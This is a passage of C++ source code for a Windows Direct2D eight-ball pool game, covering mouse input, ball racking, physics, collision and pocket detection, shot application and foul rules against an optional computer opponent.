                    else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                    else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                    cueAngle = 0.0f;
                }
            }
            return 0;
        }

        // Check for starting Aim (Cue Ball OR Stick)
        bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
            (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

        if (canAim) {
            const float stickDrawLength = 150.0f * 1.4f;
            float currentStickAngle = cueAngle + PI;
            D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
            D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
            float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
            float stickClickThresholdSq = 36.0f;
            float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
            float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

            bool clickedStick = (distToStickSq < stickClickThresholdSq);
            bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

            if (clickedStick || clickedCueArea) {
                isDraggingStick = clickedStick && !clickedCueArea;
                isAiming = clickedCueArea;
                aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                shotPower = 0;
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                if (currentGameState != BREAKING) currentGameState = AIMING;
            }
        }
        return 0;
    } // End WM_LBUTTONDOWN


    case WM_LBUTTONUP: {
        if (cheatModeEnabled && isDraggingCueBall) {
            isDraggingCueBall = false;
            if (draggingBallId == 0) {
                // After dropping CueBall, stay Ball-In-Hand mode if needed
                if (currentPlayer == 1)
                    currentGameState = BALL_IN_HAND_P1;
                else if (currentPlayer == 2 && !isPlayer2AI)
                    currentGameState = BALL_IN_HAND_P2;
            }
            draggingBallId = -1;
            return 0;
        }

        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        Ball* cueBall = GetCueBall(); // Get cueBall pointer

        // Check for releasing aim drag (Stick OR Cue Ball)
        if ((isAiming || isDraggingStick) &&
            ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
        {
            bool wasAiming = isAiming;
            bool wasDraggingStick = isDraggingStick;
            isAiming = false; isDraggingStick = false;

            if (shotPower > 0.15f) { // Check power threshold
                if (currentGameState != AI_THINKING) {
                    firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                    std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                    ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false; pocketedThisTurn.clear();
                }
            }
            else if (currentGameState != AI_THINKING) { // Revert state if power too low
                if (currentGameState == BREAKING) { /* Still breaking */ }
                else {
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                }
            }
            shotPower = 0; // Reset power indicator regardless
        }

        // Handle releasing cue ball drag (placement)
        if (isDraggingCueBall) {
            isDraggingCueBall = false;
            // Check player allowed to place
            bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowed = (isPlacingState &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT)));

            if (isPlayerAllowed && cueBall) {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                    // Finalize position already set by mouse move
                    // Transition state
                    if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                    else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                    else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                    cueAngle = 0.0f;
                }
                else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
            }
        }

        // Handle releasing english setting
        if (isSettingEnglish) {
            isSettingEnglish = false;
        }
        return 0;
    } // End WM_LBUTTONUP

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// --- Direct2D Resource Management ---

HRESULT CreateDeviceResources() {
    HRESULT hr = S_OK;

    // Create Direct2D Factory
    if (!pFactory) {
        hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr)) return hr;
    }

    // Create DirectWrite Factory
    if (!pDWriteFactory) {
        hr = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (FAILED(hr)) return hr;
    }

    // Create Text Formats
    if (!pTextFormat && pDWriteFactory) {
        hr = pDWriteFactory->CreateTextFormat(
            L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
            16.0f, L""en-us"", &pTextFormat
        );
        if (FAILED(hr)) return hr;
        // Center align text
        pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
        pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
    }
    if (!pLargeTextFormat && pDWriteFactory) {
        hr = pDWriteFactory->CreateTextFormat(
            L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
            48.0f, L""en-us"", &pLargeTextFormat
        );
        if (FAILED(hr)) return hr;
        pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
        pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
    }


    // Create Render Target (needs valid hwnd)
    if (!pRenderTarget && hwndMain) {
        RECT rc;
        GetClientRect(hwndMain, &rc);
        D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

        hr = pFactory->CreateHwndRenderTarget(
            D2D1::RenderTargetProperties(),
            D2D1::HwndRenderTargetProperties(hwndMain, size),
            &pRenderTarget
        );
        if (FAILED(hr)) {
            // If failed, release factories if they were created in this call
            SafeRelease(&pTextFormat);
            SafeRelease(&pLargeTextFormat);
            SafeRelease(&pDWriteFactory);
            SafeRelease(&pFactory);
            pRenderTarget = nullptr; // Ensure it's null on failure
            return hr;
        }
    }

    return hr;
}

void DiscardDeviceResources() {
    SafeRelease(&pRenderTarget);
    SafeRelease(&pTextFormat);
    SafeRelease(&pLargeTextFormat);
    SafeRelease(&pDWriteFactory);
    // Keep pFactory until application exit? Or release here too? Let's release.
    SafeRelease(&pFactory);
}

void OnResize(UINT width, UINT height) {
    if (pRenderTarget) {
        D2D1_SIZE_U size = D2D1::SizeU(width, height);
        pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
    }
}

// --- Game Initialization ---
void InitGame() {
    srand((unsigned int)time(NULL)); // Seed random number generator

    // --- Ensure pocketed list is clear from the absolute start ---
    pocketedThisTurn.clear();

    balls.clear(); // Clear existing balls

    // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
    player1Info.assignedType = BallType::NONE;
    player1Info.ballsPocketedCount = 0;
    // Player 1 Name usually remains ""Player 1""
    player2Info.assignedType = BallType::NONE;
    player2Info.ballsPocketedCount = 0;
    // Player 2 Name is set based on gameMode in ShowNewGameDialog

    // Create Cue Ball (ID 0)
    // Initial position will be set during PRE_BREAK_PLACEMENT state
    balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

    // --- Create Object Balls (Temporary List) ---
    std::vector<Ball> objectBalls;
    // Solids (1-7, Yellow)
    for (int i = 1; i <= 7; ++i) {
        objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
    }
    // Stripes (9-15, Red)
    for (int i = 9; i <= 15; ++i) {
        objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
    }
    // 8-Ball (ID 8) - Add it to the list to be placed
    objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });


    // --- Racking Logic (Improved) ---
    float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
    float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

    // Define rack positions (0-14 indices corresponding to triangle spots)
    D2D1_POINT_2F rackPositions[15];
    int rackIndex = 0;
    for (int row = 0; row < 5; ++row) {
        for (int col = 0; col <= row; ++col) {
            if (rackIndex >= 15) break;
            float x = RACK_POS_X + row * spacingX;
            float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
            rackPositions[rackIndex++] = D2D1::Point2F(x, y);
        }
    }

    // Separate 8-ball
    Ball eightBall;
    std::vector<Ball> otherBalls; // Solids and Stripes
    bool eightBallFound = false;
    for (const auto& ball : objectBalls) {
        if (ball.id == 8) {
            eightBall = ball;
            eightBallFound = true;
        }
        else {
            otherBalls.push_back(ball);
        }
    }
    // Ensure 8 ball was actually created (should always be true)
    if (!eightBallFound) {
        // Handle error - perhaps recreate it? For now, proceed.
        eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
    }


    // Shuffle the other 14 balls
    // Use std::shuffle if available (C++11 and later) for better randomness
    // std::random_device rd;
    // std::mt19937 g(rd());
    // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
    std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

    // --- Place balls into the main 'balls' vector in rack order ---
    // Important: Add the cue ball (already created) first.
    // (Cue ball added at the start of the function now)

    // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
    int eightBallRackIndex = 4;
    eightBall.x = rackPositions[eightBallRackIndex].x;
    eightBall.y = rackPositions[eightBallRackIndex].y;
    eightBall.vx = 0;
    eightBall.vy = 0;
    eightBall.isPocketed = false;
    balls.push_back(eightBall); // Add 8 ball to the main vector

    // 2. Place the shuffled Solids and Stripes in the remaining spots
    int otherBallIdx = 0;
    for (int i = 0; i < 15; ++i) {
        if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

        if (otherBallIdx < otherBalls.size()) {
            Ball& ballToPlace = otherBalls[otherBallIdx++];
            ballToPlace.x = rackPositions[i].x;
            ballToPlace.y = rackPositions[i].y;
            ballToPlace.vx = 0;
            ballToPlace.vy = 0;
            ballToPlace.isPocketed = false;
            balls.push_back(ballToPlace); // Add to the main game vector
        }
    }
    // --- End Racking Logic ---


    // --- Determine Who Breaks and Initial State ---
    if (isPlayer2AI) {
        // AI Mode: Randomly decide who breaks
        if ((rand() % 2) == 0) {
            // AI (Player 2) breaks
            currentPlayer = 2;
            currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
            aiTurnPending = true; // Trigger AI logic
        }
        else {
            // Player 1 (Human) breaks
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
            aiTurnPending = false;
        }
    }
    else {
        // Human vs Human, Player 1 breaks
        currentPlayer = 1;
        currentGameState = PRE_BREAK_PLACEMENT;
        aiTurnPending = false; // No AI involved
    }

    // Reset other relevant game state variables
    foulCommitted = false;
    gameOverMessage = L"""";
    firstBallPocketedAfterBreak = false;
    // pocketedThisTurn cleared at start
    // Reset shot parameters and input flags
    shotPower = 0.0f;
    cueSpinX = 0.0f;
    cueSpinY = 0.0f;
    isAiming = false;
    isDraggingCueBall = false;
    isSettingEnglish = false;
    cueAngle = 0.0f; // Reset aim angle
}


// --- Game Loop ---
void GameUpdate() {
    if (currentGameState == SHOT_IN_PROGRESS) {
        UpdatePhysics();
        CheckCollisions();
        bool pocketed = CheckPockets(); // Store if any ball was pocketed

                // --- Update pocket flash animation timer ---
        if (pocketFlashTimer > 0.0f) {
            pocketFlashTimer -= 0.02f;
            if (pocketFlashTimer < 0.0f) pocketFlashTimer = 0.0f;

        }


        if (!AreBallsMoving()) {
            ProcessShotResults(); // Determine next state based on what happened
        }
    }
    // --- Check if AI needs to act ---
    else if (aiTurnPending && !AreBallsMoving()) {
        // --- MODIFIED: Add BALL_IN_HAND_P2 to trigger states ---
        if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING ||
            currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BALL_IN_HAND_P2)
            // --- End Modification ---
        {
            // Only trigger if AI is P2 and it's their turn/placement phase
            if (isPlayer2AI && currentPlayer == 2) {
                currentGameState = AI_THINKING;
                aiTurnPending = false; // Acknowledge the pending flag

                // Trigger AI Decision Making (will handle placement if state is BALL_IN_HAND_P2)
                AIMakeDecision();

                // AIMakeDecision should end by setting currentGameState = SHOT_IN_PROGRESS (via ApplyShot)
            }
            else {
                aiTurnPending = false; // Clear flag if conditions not met
            }
        }
        else {
            aiTurnPending = false; // Clear flag if not in a state where AI should shoot/place
        }
    }
    // Other states are handled by input messages or state transitions
}

// --- Physics and Collision ---
void UpdatePhysics() {
    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b = balls[i];
        if (!b.isPocketed) {
            b.x += b.vx;
            b.y += b.vy;

            // Apply friction
            b.vx *= FRICTION;
            b.vy *= FRICTION;

            // Stop balls if velocity is very low
            if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                b.vx = 0;
                b.vy = 0;
            }
        }
    }
}

void CheckCollisions() {
    float left = TABLE_LEFT;
    float right = TABLE_RIGHT;
    float top = TABLE_TOP;
    float bottom = TABLE_BOTTOM;
    const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

    // --- Reset Per-Frame Sound Flags ---
    bool playedWallSoundThisFrame = false;
    bool playedCollideSoundThisFrame = false;
    // ---

    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b1 = balls[i];
        if (b1.isPocketed) continue;

        bool nearPocket[6];
        for (int p = 0; p < 6; ++p) {
            nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
        }
        bool nearTopLeftPocket = nearPocket[0];
        bool nearTopMidPocket = nearPocket[1];
        bool nearTopRightPocket = nearPocket[2];
        bool nearBottomLeftPocket = nearPocket[3];
        bool nearBottomMidPocket = nearPocket[4];
        bool nearBottomRightPocket = nearPocket[5];

        bool collidedWallThisBall = false;

        // --- Ball-Wall Collisions ---
        // (Check logic unchanged, added sound calls and railHitAfterContact update)
        // Left Wall
        if (b1.x - BALL_RADIUS < left) {
            if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                if (!playedWallSoundThisFrame) {
                    std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                    playedWallSoundThisFrame = true;
                }
                if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
            }
        }
        // Right Wall
        if (b1.x + BALL_RADIUS > right) {
            if (!nearTopRightPocket && !nearBottomRightPocket) {
                b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                if (!playedWallSoundThisFrame) {
                    std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                    playedWallSoundThisFrame = true;
                }
                if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
            }
        }
        // Top Wall
        if (b1.y - BALL_RADIUS < top) {
            if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                if (!playedWallSoundThisFrame) {
                    std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                    playedWallSoundThisFrame = true;
                }
                if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
            }
        }
        // Bottom Wall
        if (b1.y + BALL_RADIUS > bottom) {
            if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                if (!playedWallSoundThisFrame) {
                    std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                    playedWallSoundThisFrame = true;
                }
                if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
            }
        }

        // Spin effect (Unchanged)
        if (collidedWallThisBall) {
            if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
            if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
            cueSpinX *= 0.7f; cueSpinY *= 0.7f;
        }


        // --- Ball-Ball Collisions ---
        for (size_t j = i + 1; j < balls.size(); ++j) {
            Ball& b2 = balls[j];
            if (b2.isPocketed) continue;

            float dx = b2.x - b1.x; float dy = b2.y - b1.y;
            float distSq = dx * dx + dy * dy;
            float minDist = BALL_RADIUS * 2.0f;

            if (distSq > 1e-6 && distSq < minDist * minDist) {
                float dist = sqrtf(distSq);
                float overlap = minDist - dist;
                float nx = dx / dist; float ny = dy / dist;

                // Separation (Unchanged)
                b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                float velAlongNormal = rvx * nx + rvy * ny;

                if (velAlongNormal > 0) { // Colliding
                    // --- Play Ball Collision Sound ---
                    if (!playedCollideSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                        playedCollideSoundThisFrame = true; // Set flag
                    }
                    // --- End Sound ---

                    // --- NEW: Track First Hit and Cue/Object Collision ---
                    if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                        if (b1.id == 0) { // Cue ball hit b2 first
                            firstHitBallIdThisShot = b2.id;
                            cueHitObjectBallThisShot = true;
                        }
                        else if (b2.id == 0) { // Cue ball hit b1 first
                            firstHitBallIdThisShot = b1.id;
                            cueHitObjectBallThisShot = true;
                        }
                        // If neither is cue ball, doesn't count as first hit for foul purposes
                    }
                    else if (b1.id == 0 || b2.id == 0) {
                        // Track subsequent cue ball collisions with object balls
                        cueHitObjectBallThisShot = true;
                    }
                    // --- End First Hit Tracking ---


                    // Impulse (Unchanged)
                    float impulse = velAlongNormal;
                    b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                    b2.vx += impulse * nx; b2.vy += impulse * ny;

                    // Spin Transfer (Unchanged)
                    if (b1.id == 0 || b2.id == 0) {
                        float spinEffectFactor = 0.08f;
                        b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                        b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                        b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                        b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                        cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                    }
                }
            }
        } // End ball-ball loop
    } // End ball loop
} // End CheckCollisions


bool CheckPockets() {
    bool ballPocketedThisCheck = false; // Local flag for this specific check run
    for (size_t i = 0; i < balls.size(); ++i) {
        Ball& b = balls[i];
        if (!b.isPocketed) { // Only check balls that aren't already flagged as pocketed
            for (int p = 0; p < 6; ++p) {
                float distSq = GetDistanceSq(b.x, b.y, pocketPositions[p].x, pocketPositions[p].y);
                // --- Use updated POCKET_RADIUS ---
                if (distSq < POCKET_RADIUS * POCKET_RADIUS) {
                    b.isPocketed = true;
                    b.vx = b.vy = 0;
                    pocketedThisTurn.push_back(b.id);

                    // --- Play Pocket Sound (Threaded) ---
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound ---

                    break; // Ball is pocketed
                }
            }
        }
    }
    return ballPocketedThisCheck;
}

bool AreBallsMoving() {
    for (size_t i = 0; i < balls.size(); ++i) {
        if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
            return true;
        }
    }
    return false;
}

void RespawnCueBall(bool behindHeadstring) { // 'behindHeadstring' only relevant for initial break placement
    Ball* cueBall = GetCueBall();
    if (cueBall) {
        // Reset position to a default
        cueBall->x = HEADSTRING_X * 0.5f;
        cueBall->y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
        cueBall->vx = 0;
        cueBall->vy = 0;
        cueBall->isPocketed = false;

        // Set state based on who gets ball-in-hand
        // 'currentPlayer' already reflects who's turn it is NOW (switched before calling this)
        if (currentPlayer == 1) { // Player 2 (AI/Human) fouled, Player 1 (Human) gets ball-in-hand
            currentGameState = BALL_IN_HAND_P1;
            aiTurnPending = false; // Ensure AI flag off
        }
        else { // Player 1 (Human) fouled, Player 2 gets ball-in-hand
            if (isPlayer2AI) {
                // --- CONFIRMED FIX: Set correct state for AI Ball-in-Hand ---
                currentGameState = BALL_IN_HAND_P2; // AI now needs to place the ball
                aiTurnPending = true; // Trigger AI logic (will call AIPlaceCueBall first)
            }
            else { // Human Player 2
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = false; // Ensure AI flag off
            }
        }
        // Handle initial placement state correctly if called from InitGame
        if (behindHeadstring && currentGameState != PRE_BREAK_PLACEMENT) {
            // This case might need review depending on exact initial setup flow,
            // but the foul logic above should now be correct.
            // Let's ensure initial state is PRE_BREAK_PLACEMENT if behindHeadstring is true.
            currentGameState = PRE_BREAK_PLACEMENT;
        }
    }
}


// --- Game Logic ---

void ApplyShot(float power, float angle, float spinX, float spinY) {
    Ball* cueBall = GetCueBall();
    if (cueBall) {

        // --- Play Cue Strike Sound (Threaded) ---
        if (power > 0.1f) { // Only play if it's an audible shot
            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
        }
        // --- End Sound ---

        cueBall->vx = cosf(angle) * power;
        cueBall->vy = sinf(angle) * power;

        // Apply English (Spin) - Simplified effect (Unchanged)
        cueBall->vx += sinf(angle) * spinY * 0.5f;
        cueBall->vy -= cosf(angle) * spinY * 0.5f;
        cueBall->vx -= cosf(angle) * spinX * 0.5f;
        cueBall->vy -= sinf(angle) * spinX * 0.5f;

        // Store spin (Unchanged)
        cueSpinX = spinX;
        cueSpinY = spinY;

        // --- Reset Foul Tracking flags for the new shot ---
        // (Also reset in LBUTTONUP, but good to ensure here too)
        firstHitBallIdThisShot = -1;      // No ball hit yet
        cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
        railHitAfterContact = false;     // No rail hit after contact yet
        // --- End Reset ---
    }
}


void ProcessShotResults() {
    bool cueBallPocketed = false;
    bool eightBallPocketed = false;
    bool legalBallPocketed = false;
    bool opponentBallPocketed = false;
    bool anyNonCueBallPocketed = false; // Includes opponent balls
    BallType firstPocketedType = BallType::NONE;
    int firstPocketedId = -1;

    PlayerInfo& currentPlayerInfo = (currentPlayer == 1) ? player1Info : player2Info;
    PlayerInfo& opponentPlayerInfo = (currentPlayer == 1) ? player2Info : player1Info;

    // Analyze pocketed balls (Unchanged logic)
    for (int pocketedId : pocketedThisTurn) {
        Ball* b = GetBallById(pocketedId);
        if (!b) continue;
        if (!pocketedThisTurn.empty()) {
            pocketFlashTimer = 1.0f; // Flash boost when any ball is pocketed
        }
        if (b->id == 0) { cueBallPocketed = true; }
        else if (b->id == 8) { eightBallPocketed = true; }
        else {
            anyNonCueBallPocketed = true;
            if (firstPocketedId == -1) { firstPocketedId = b->id; firstPocketedType = b->type; }
            if (currentPlayerInfo.assignedType != BallType::NONE) {
                if (b->type == currentPlayerInfo.assignedType) legalBallPocketed = true;
                else if (b->type == opponentPlayerInfo.assignedType) opponentBallPocketed = true;
            }
        }
    }

    // --- Game Over Checks --- (Unchanged logic)
    if (eightBallPocketed) {
        CheckGameOverConditions(eightBallPocketed, cueBallPocketed);
        if (currentGameState == GAME_OVER) return;
    }

    // --- MODIFIED: Enhanced Foul Checks ---
    bool turnFoul = false;

    // Foul 1: Scratch (Cue ball pocketed)
    if (cueBallPocketed) {
        foulCommitted = true; turnFoul = true;
    }

    // Foul 2: Hit Nothing (Only if not already a scratch)
    // Condition: Cue ball didn't hit *any* object ball during the shot.
    if (!turnFoul && !cueHitObjectBallThisShot) {
        // Check if the cue ball actually moved significantly to constitute a shot attempt
        Ball* cue = GetCueBall();
        // Use a small threshold to avoid foul on accidental tiny nudge if needed
        // For now, any shot attempt that doesn't hit an object ball is a foul.
        // (Could add velocity check from ApplyShot if needed)
        if (cue) { // Ensure cue ball exists
            foulCommitted = true; turnFoul = true;
        }
    }

    // Foul 3: Wrong Ball First (Check only if not already foul and *something* was hit)
    if (!turnFoul && firstHitBallIdThisShot != -1) {
        Ball* firstHitBall = GetBallById(firstHitBallIdThisShot);
        if (firstHitBall) {
            bool isBreakShot = (player1Info.assignedType == BallType::NONE && player2Info.assignedType == BallType::NONE);
            bool mustTarget8Ball = (!isBreakShot && currentPlayerInfo.assignedType != BallType::NONE && currentPlayerInfo.ballsPocketedCount >= 7);

            if (!isBreakShot) { // Standard play rules
                if (mustTarget8Ball) {
                    if (firstHitBall->id != 8) { foulCommitted = true; turnFoul = true; }
                }
                else if (currentPlayerInfo.assignedType != BallType::NONE) { // Colors assigned
                  // Illegal to hit opponent ball OR 8-ball first
                    if (firstHitBall->type == opponentPlayerInfo.assignedType || firstHitBall->id == 8) {
                        foulCommitted = true; turnFoul = true;
                    }
                }
                // If colors NOT assigned yet (e.g. shot immediately after break), hitting any ball is legal first.
            }
            // No specific first-hit foul rules applied for the break itself here.
        }
    }

    // Foul 4: No Rail After Contact (Check only if not already foul)
    // Condition: Cue hit an object ball, BUT after that first contact,
    //            NO ball hit a rail AND NO object ball was pocketed (excluding cue/8-ball).
    if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && !anyNonCueBallPocketed) {
        foulCommitted = true;
        turnFoul = true;
    }

    // Foul 5: Pocketing Opponent's Ball (Optional stricter rule - can uncomment if desired)
    // if (!turnFoul && opponentBallPocketed) {
    //     foulCommitted = true; turnFoul = true;
    // }
    // --- End Enhanced Foul Checks ---


    // --- State Transitions ---
    if (turnFoul) {
        SwitchTurns();
        RespawnCueBall(false); // Ball in hand for opponent (state set in Respawn)
    }
    // --- Assign Ball Types only AFTER checking for fouls on the break/first shot ---
    else if (player1Info.assignedType == BallType::NONE && anyNonCueBallPocketed) {
        // (Assign types logic - unchanged)
        bool firstTypeVerified = false;
        for (int id : pocketedThisTurn) { if (id == firstPocketedId) { firstTypeVerified = true; break; } }

        if (firstTypeVerified && (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE)) {
            AssignPlayerBallTypes(firstPocketedType);
            legalBallPocketed = true;
        }
        // After assignment (or if types already assigned), check if turn continues
        if (legalBallPocketed) { // Player legally pocketed their assigned type (newly or existing)
            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = true;
        }
        else { // Pocketed wrong ball, or only opponent ball, or missed (but no foul committed)
            SwitchTurns();
        }
    }
    // --- Normal Play Results (Types Assigned) ---
    else if (player1Info.assignedType != BallType::NONE) { // Ensure types assigned before this block
        if (legalBallPocketed) { // Legally pocketed own ball
            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = true; // AI continues turn
        }
        else { // No legal ball pocketed (or no ball pocketed at all) and no foul
            SwitchTurns();
        }
    }
    // --- Handle case where shot occurred but no balls pocketed and no foul ---
    else if (!anyNonCueBallPocketed && !turnFoul) {
        SwitchTurns();
    }


    // Update pocketed counts AFTER handling turns/fouls/assignment
    int p1NewlyPocketed = 0;
    int p2NewlyPocketed = 0;
    for (int id : pocketedThisTurn) {
        if (id == 0 || id == 8) continue; // Skip cue ball and 8-ball
        Ball* b = GetBallById(id);
        if (!b) continue; // extra safety
